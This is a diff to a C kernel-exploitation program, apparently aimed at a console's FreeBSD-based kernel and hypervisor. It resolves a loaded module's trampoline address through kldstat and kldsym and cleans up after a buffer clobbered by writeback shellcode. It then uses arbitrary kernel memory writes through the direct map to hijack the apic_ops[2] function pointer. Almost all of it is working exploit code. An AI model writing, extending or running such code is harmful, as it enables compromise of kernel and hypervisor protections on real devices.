@@ -174,6 +174,7 @@ static uint64_t g_kmod_trampoline_target = 0;  /* KVA of g_trampoline_target in 
 static uint64_t g_kld_text_trampoline = 0;     /* KVA of trampoline in kmod .text (preserved) */
 static uint64_t g_kld_text_target = 0;         /* KVA of g_trampoline_target in kmod (preserved) */
 static uint64_t g_kmod_gp_handler = 0;         /* KVA of gp_handler() in kmod .text */
+static uint64_t g_kmod_base = 0;               /* kldstat-reported module base address */
 static int      g_kmod_kid = -1;               /* kldload file ID (-1 = not loaded) */
 
 /* Minimal xapic_mode gadget: `mov eax, 1; ret` in kdata cave (set by Phase 5b) */
@@ -1118,8 +1119,9 @@ static void campaign_kmod_kldload(void) {
         kfs.version = sizeof(kfs);
         int ks_ret = syscall(SYS_kldstat, kid, &kfs);
         if (ks_ret == 0 && kfs.address != 0) {
+            g_kmod_base = (uint64_t)(uintptr_t)kfs.address;
             printf("[+] kldstat: base=0x%lx size=0x%lx name=%s\n",
-                   (unsigned long)(uintptr_t)kfs.address,
+                   (unsigned long)g_kmod_base,
                    (unsigned long)kfs.size, kfs.name);
         } else {
             printf("[*] kldstat returned %d (address=0x%lx) — will scan for module.\n",
@@ -4087,6 +4089,19 @@ ring3_fallback:
                         }
                     }
                     } /* end apic_pa valid check */
+
+                    /* Clear result buffer fields clobbered by writeback shellcode.
+                     * The shellcode writes apic_ops values to byte offsets 32/40/48
+                     * which overlay trampoline_func_kva, trampoline_target_kva, and
+                     * gp_handler_kva in kmod_result_buf.  Without this clear, the
+                     * post-campaign code misinterprets the original xapic_mode address
+                     * as a kmod trampoline address — making the KLD suspend test a
+                     * no-op (it just writes back the original value). */
+                    results->trampoline_func_kva = 0;
+                    results->trampoline_target_kva = 0;
+                    results->gp_handler_kva = 0;
+                    printf("[*] Cleared writeback-clobbered trampoline fields in buffer.\n");
+
                     printf("\n");
                     fflush(stdout);
                 }
@@ -4521,6 +4536,85 @@ idt_skip: ;
         g_kld_text_target = results->trampoline_target_kva;
         printf("    [+] KLD .text trampoline preserved: 0x%016lx\n",
                (unsigned long)g_kld_text_trampoline);
+    }
+
+    /* ── KLD .text resolution via kldstat base + known layout ──
+     *
+     * If the result buffer didn't provide trampoline addresses (common on
+     * FW 4.03 where SYSINIT/MOD_LOAD don't fire and kmod pages are NPT
+     * read-protected), compute them from the kldstat-reported module base
+     * and known .text layout offsets from compilation:
+     *
+     *   module_base + 0x00: hv_idt_trampoline (35 bytes naked asm)
+     *   module_base + 0x23: trampoline_xapic_mode() function
+     *
+     * We can't verify by reading the code (NPT blocks DMAP reads of kmod
+     * pages), but kldstat base is reliable and the .text layout is fixed
+     * by compilation.  The function is in kmod .text which is executable
+     * via kmod page table mappings.
+     *
+     * For g_trampoline_target: try kldsym first, then leave as 0 (safe —
+     * the trampoline returns 1 when target is NULL, which is correct for
+     * xapic_mode during LAPIC suspend). */
+    if (!g_kld_text_trampoline && g_kmod_base != 0) {
+        printf("\n[*] KLD .text resolution via kldstat base + known offset:\n");
+        printf("    kldstat module base = 0x%016lx\n", (unsigned long)g_kmod_base);
+
+        /* Verify the module base maps to a valid physical page */
+        uint64_t mod_base_pa = va_to_pa_quiet(g_kmod_base);
+        if (mod_base_pa != 0) {
+            g_kld_text_trampoline = g_kmod_base + KMOD_XAPIC_OFFSET;
+            printf("    trampoline_xapic_mode() = 0x%016lx (base + 0x%x)\n",
+                   (unsigned long)g_kld_text_trampoline, KMOD_XAPIC_OFFSET);
+            printf("    module base PA = 0x%lx [mapped]\n",
+                   (unsigned long)mod_base_pa);
+
+            /* Try kldsym to resolve g_trampoline_target */
+            struct kld_sym_lookup sym;
+            memset(&sym, 0, sizeof(sym));
+            sym.version = sizeof(struct kld_sym_lookup);
+            sym.symname = "g_trampoline_target";
+            int sym_ret = syscall(SYS_kldsym, kid, KLDSYM_LOOKUP, &sym);
+            if (sym_ret == 0 && sym.symvalue != 0) {
+                g_kld_text_target = sym.symvalue;
+                printf("    g_trampoline_target     = 0x%016lx (kldsym)\n",
+                       (unsigned long)g_kld_text_target);
+            } else {
+                printf("    kldsym(g_trampoline_target): ret=%d val=0x%lx\n",
+                       sym_ret, (unsigned long)sym.symvalue);
+                printf("    g_kld_text_target left at 0 — safe test only (return 1).\n");
+            }
+
+            /* Also try resolving trampoline_xapic_mode via kldsym as cross-check */
+            memset(&sym, 0, sizeof(sym));
+            sym.version = sizeof(struct kld_sym_lookup);
+            sym.symname = "trampoline_xapic_mode";
+            sym_ret = syscall(SYS_kldsym, kid, KLDSYM_LOOKUP, &sym);
+            if (sym_ret == 0 && sym.symvalue != 0) {
+                printf("    kldsym(trampoline_xapic_mode) = 0x%016lx",
+                       (unsigned long)sym.symvalue);
+                if (sym.symvalue == g_kld_text_trampoline)
+                    printf(" [matches kldstat+offset]\n");
+                else {
+                    printf(" [DIFFERS from kldstat+offset 0x%lx]\n",
+                           (unsigned long)g_kld_text_trampoline);
+                    /* Trust kldsym if it gives a different address */
+                    g_kld_text_trampoline = sym.symvalue;
+                    printf("    Using kldsym value instead.\n");
+                }
+            } else {
+                printf("    kldsym(trampoline_xapic_mode): ret=%d (using kldstat+offset)\n",
+                       sym_ret);
+            }
+
+            printf("[+] KLD .text trampoline resolved: 0x%016lx\n",
+                   (unsigned long)g_kld_text_trampoline);
+
+            /* Ensure kmod stays loaded for suspend test */
+            if (g_kmod_kid <= 0) g_kmod_kid = kid;
+        } else {
+            printf("    [-] Module base VA→PA failed — module may not be mapped.\n");
+        }
     }
 
     /* gp_handler KVA: check globals first (set via result buffer or scanner),
@@ -5802,47 +5896,73 @@ static void campaign_flatz_setup(void) {
             {
                 int kld_armed = 0;
 
-                if (g_kld_text_trampoline && g_kld_text_target) {
+                if (g_kld_text_trampoline) {
                     printf("\n[*] KLD .text suspend test:\n");
                     printf("    kld trampoline = 0x%016lx (kmod .text)\n",
                            (unsigned long)g_kld_text_trampoline);
                     printf("    kld target var = 0x%016lx (kmod .data)\n",
                            (unsigned long)g_kld_text_target);
 
-                    /* Zero out g_trampoline_target so trampoline just
-                     * returns 1 with no call-through (safest test). */
-                    uint64_t target_pa = va_to_pa_quiet(g_kld_text_target);
-                    if (target_pa) {
-                        uint64_t zero = 0;
-                        kernel_copyin(&zero, g_dmap_base + target_pa, 8);
-                        uint64_t tv = 0;
-                        kernel_copyout(g_dmap_base + target_pa, &tv, 8);
-                        printf("    g_trampoline_target = 0x%lx [%s]\n",
-                               (unsigned long)tv, tv == 0 ? "ZEROED" : "FAIL");
+                    /* Verify trampoline address is NOT the original xapic_mode.
+                     * Previous bug: writeback shellcode clobbered the result
+                     * buffer, making g_kld_text_trampoline == original_xapic.
+                     * That turned the test into a no-op. */
+                    if (g_kld_text_trampoline == original_xapic) {
+                        printf("    [!] ABORT: trampoline addr == original xapic_mode!\n");
+                        printf("    This is NOT a genuine kmod .text address.\n");
+                        printf("    Possible buffer corruption — skipping test.\n");
                     } else {
-                        printf("    [-] Cannot translate kld target VA to PA\n");
-                    }
-
-                    /* Arm apic_ops[2] with kmod .text trampoline */
-                    kernel_copyin(&g_kld_text_trampoline,
-                                  g_dmap_base + ops_pa + 0x10, 8);
-                    uint64_t av = 0;
-                    kernel_copyout(g_dmap_base + ops_pa + 0x10, &av, 8);
-                    printf("    apic_ops[2] = 0x%016lx [%s]\n",
-                           (unsigned long)av,
-                           av == g_kld_text_trampoline ? "KLD ARMED" : "FAIL");
-
-                    if (av == g_kld_text_trampoline && target_pa) {
-                        kld_armed = 1;
-                        /* Quick 2s stability check before suspend */
-                        printf("    Stability check (2s)...\n");
-                        fflush(stdout);
-                        for (int t = 1; t <= 2; t++) {
-                            sleep(1);
-                            printf("    Tick %d/2 — alive\n", t);
-                            fflush(stdout);
+                        /* Zero out g_trampoline_target so trampoline just
+                         * returns 1 with no call-through (safest test).
+                         *
+                         * If g_kld_text_target is 0 (kldsym failed), the kmod
+                         * initialized g_trampoline_target = 0 at load time.
+                         * The trampoline checks: if (target) call; else return 1.
+                         * So with target=0, it safely returns APIC_MODE_XAPIC. */
+                        int target_ok = 1;
+                        if (g_kld_text_target) {
+                            uint64_t target_pa = va_to_pa_quiet(g_kld_text_target);
+                            if (target_pa) {
+                                uint64_t zero = 0;
+                                kernel_copyin(&zero, g_dmap_base + target_pa, 8);
+                                uint64_t tv = 0;
+                                kernel_copyout(g_dmap_base + target_pa, &tv, 8);
+                                printf("    g_trampoline_target = 0x%lx [%s]\n",
+                                       (unsigned long)tv, tv == 0 ? "ZEROED" : "FAIL");
+                                if (tv != 0) target_ok = 0;
+                            } else {
+                                printf("    [-] Cannot translate kld target VA to PA\n");
+                                target_ok = 0;
+                            }
+                        } else {
+                            printf("    g_trampoline_target address unknown (kldsym failed).\n");
+                            printf("    Kmod initialized target=0 at load → trampoline returns 1.\n");
+                            printf("    Safe test mode: no call-through, just 'mov eax, 1; ret'.\n");
                         }
-                        printf("    [OK] KLD trampoline stable during normal ops.\n");
+
+                        if (target_ok) {
+                            /* Arm apic_ops[2] with kmod .text trampoline */
+                            kernel_copyin(&g_kld_text_trampoline,
+                                          g_dmap_base + ops_pa + 0x10, 8);
+                            uint64_t av = 0;
+                            kernel_copyout(g_dmap_base + ops_pa + 0x10, &av, 8);
+                            printf("    apic_ops[2] = 0x%016lx [%s]\n",
+                                   (unsigned long)av,
+                                   av == g_kld_text_trampoline ? "KLD ARMED" : "FAIL");
+
+                            if (av == g_kld_text_trampoline) {
+                                kld_armed = 1;
+                                /* Quick 2s stability check before suspend */
+                                printf("    Stability check (2s)...\n");
+                                fflush(stdout);
+                                for (int t = 1; t <= 2; t++) {
+                                    sleep(1);
+                                    printf("    Tick %d/2 — alive\n", t);
+                                    fflush(stdout);
+                                }
+                                printf("    [OK] KLD trampoline stable during normal ops.\n");
+                            }
+                        }
                     }
                 } else {
                     printf("\n[-] KLD .text trampoline not available.\n");
